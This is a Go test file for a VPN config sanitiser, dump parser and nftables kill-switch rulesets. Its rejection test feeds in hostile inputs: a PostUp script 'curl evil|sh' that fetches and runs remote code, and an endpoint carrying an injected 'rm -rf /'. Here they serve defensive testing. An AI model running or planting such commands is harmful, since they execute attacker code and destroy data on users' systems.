package main

import (
	"net/netip"
	"strings"
	"testing"
	"time"
)

const goodConf = `[Interface]
Address = 10.0.0.2/32
DNS = 1.1.1.1
PrivateKey = AAAA
Jc = 4
HeaderProtectionKey = BBBB
H1 = 10-20
SaveConfig = true
Table = off
FwMark = 5

[Peer]
PublicKey = CCCC
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.7:51821
PersistentKeepalive = 23-28
`

func TestSanitizeConf(t *testing.T) {
	pc, err := SanitizeConf(goodConf)
	if err != nil {
		t.Fatal(err)
	}
	if pc.EndpointHost != "203.0.113.7" || pc.EndpointPort != 51821 {
		t.Fatalf("endpoint: %+v", pc)
	}
	for _, bad := range []string{"SaveConfig", "Table", "FwMark"} {
		if strings.Contains(pc.Text, bad) {
			t.Errorf("%s должен быть удалён", bad)
		}
	}
	for _, keep := range []string{"HeaderProtectionKey = BBBB", "H1 = 10-20", "PersistentKeepalive = 23-28", "[Interface]", "[Peer]"} {
		if !strings.Contains(pc.Text, keep) {
			t.Errorf("потеряно %q", keep)
		}
	}
}

func TestSanitizeConfRejects(t *testing.T) {
	cases := map[string]string{
		"скрипт PostUp":   strings.Replace(goodConf, "Jc = 4", "PostUp = curl evil|sh", 1),
		"скрипт preup":    strings.Replace(goodConf, "Jc = 4", "preup=id", 1),
		"нет peer":        "[Interface]\nPrivateKey = A\n",
		"два peer":        goodConf + "\n[Peer]\nPublicKey = D\nEndpoint = 1.1.1.1:1\n",
		"нет endpoint":    strings.Replace(goodConf, "Endpoint = 203.0.113.7:51821\n", "", 1),
		"плохой endpoint": strings.Replace(goodConf, "203.0.113.7:51821", "1.2.3.4;rm -rf /:51821", 1),
		"порт":            strings.Replace(goodConf, ":51821", ":0", 1),
		"нулевой байт":    goodConf + "\x00",
		"раздел":          goodConf + "\n[Evil]\n",
		"вне раздела":     "PrivateKey = x\n" + goodConf,
	}
	for name, c := range cases {
		if _, err := SanitizeConf(c); err == nil {
			t.Errorf("%s: ожидалась ошибка", name)
		}
	}
	if pc, err := SanitizeConf(strings.Replace(goodConf, "203.0.113.7:51821", "[2001:db8::1]:443", 1)); err != nil || pc.EndpointHost != "2001:db8::1" {
		t.Errorf("ipv6 endpoint: %v %+v", err, pc)
	}
}

func TestParseAwgDump(t *testing.T) {
	dump := "PRIV\tPUB\t0\t0xca6c\n" +
		"PEER1\t(none)\t1.2.3.4:51821\t0.0.0.0/0\t1700000000\t1000\t2000\t25\n" +
		"PEER2\t(none)\t(none)\t10.0.0.0/8\t0\t5\t6\toff\n"
	d, err := ParseAwgDump(dump)
	if err != nil {
		t.Fatal(err)
	}
	if d.FwMark != 0xca6c || d.Rx != 1005 || d.Tx != 2006 || d.LastHandshake != time.Unix(1700000000, 0) {
		t.Fatalf("%+v", d)
	}
	d, _ = ParseAwgDump("PRIV\tPUB\t0\toff\nP\t(none)\t(none)\t0.0.0.0/0\t0\t0\t0\toff\n")
	if !d.LastHandshake.IsZero() || d.FwMark != 0 {
		t.Fatalf("без рукопожатия: %+v", d)
	}
	if _, err := ParseAwgDump(""); err == nil {
		t.Fatal("пустой вывод должен быть ошибкой")
	}
}

func TestKillSwitchRuleset(t *testing.T) {
	r := KillSwitchRuleset(KSParams{Endpoint: netip.MustParseAddr("203.0.113.7"), Port: 51821})
	for _, want := range []string{"table inet privata_ks", `oifname "privata0" accept`, "ip daddr 203.0.113.7 udp dport 51821 accept", "meta mark 0xca6c accept", "drop"} {
		if !strings.Contains(r, want) {
			t.Errorf("нет %q:\n%s", want, r)
		}
	}
	if strings.Contains(r, "192.168.0.0/16") || strings.Contains(r, "0x5052") {
		t.Error("LAN и метка раздельного туннелирования по умолчанию запрещены")
	}
	r = KillSwitchRuleset(KSParams{Endpoint: netip.MustParseAddr("2001:db8::1"), Port: 443, AllowLAN: true, AllowSplitMark: true})
	if !strings.Contains(r, "ip6 daddr 2001:db8::1 udp dport 443 accept") || !strings.Contains(r, "192.168.0.0/16") || !strings.Contains(r, "meta mark 0x5052 accept") {
		t.Errorf("параметры не применены:\n%s", r)
	}
	if strings.Index(r, "drop") < strings.Index(r, "0x5052") {
		t.Error("drop должен идти последним")
	}
}

func TestValidateOptionsAndShutdown(t *testing.T) {
	v, err := Validate(&Request{Op: OpConnect, Config: "x", Options: &Options{KillSwitch: true, AllowLAN: true}})
	if err != nil || !v.Options.KillSwitch || !v.Options.AllowLAN {
		t.Fatalf("%v %+v", err, v)
	}
	if _, err := Validate(&Request{Op: OpShutdown}); err != nil {
		t.Fatal(err)
	}
}

func TestTuneRuleset(t *testing.T) {
	r := TuneRuleset(true)
	for _, want := range []string{"tcp option maxseg size set rt mtu", "reject with icmpv6 type no-route", "hook forward", "hook output"} {
		if !strings.Contains(r, want) {
			t.Errorf("нет %q", want)
		}
	}
	if strings.Contains(TuneRuleset(false), "icmpv6") {
		t.Error("без блокировки IPv6 reject не нужен")
	}
}
